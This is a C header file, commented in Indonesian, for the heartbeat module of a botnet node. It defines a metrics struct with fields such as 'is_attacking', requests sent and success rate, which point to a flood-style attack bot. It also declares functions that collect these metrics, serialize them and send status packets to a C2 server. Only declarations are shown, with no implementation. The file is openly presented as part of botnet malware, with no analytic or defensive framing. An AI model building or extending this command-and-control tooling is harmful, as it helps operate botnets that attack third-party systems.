/**
 * @file heartbeat.h
 * @brief Definisi struktur dan fungsi laporan kesehatan (health check) node botnet.
 */

#ifndef HEARTBEAT_H
#define HEARTBEAT_H

#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#define HEARTBEAT_INTERVAL_SEC 30

typedef struct {
    uint32_t node_id;
    char node_ip[64];
    float cpu_usage_pct;
    float memory_usage_pct;
    uint32_t active_threads;
    uint64_t total_requests_sent;
    uint32_t current_success_rate;
    time_t uptime_seconds;
    bool is_attacking;
} node_metrics_t;

/**
 * @brief Menginisialisasi modul heartbeat dengan ID node tertentu.
 * @param node_id ID unik untuk instance bot/node.
 * @param ip Alamat IP lokal/eksternal node.
 */
void heartbeat_init(uint32_t node_id, const char *ip);

/**
 * @brief Mengumpulkan metrik sistem saat ini (CPU, memori, statistik request).
 * @param metrics Pointer ke struct node_metrics_t yang akan diisi.
 */
void heartbeat_collect_metrics(node_metrics_t *metrics);

/**
 * @brief Membuat payload heartbeat yang siap dikirim (bisa diserialisasi ke Protobuf).
 * @param metrics Pointer ke struct node_metrics_t.
 * @param out_buffer Buffer penampung hasil serialisasi.
 * @param max_len Panjang maksimum buffer.
 * @return int Ukuran data terserialisasi atau -1 jika gagal.
 */
int heartbeat_serialize(const node_metrics_t *metrics, uint8_t *out_buffer, size_t max_len);

/**
 * @brief Mengirim paket heartbeat ke C2 server.
 * @return int 0 jika sukses terkirim, -1 jika gagal.
 */
int heartbeat_send_packet(void);

#endif // HEARTBEAT_H

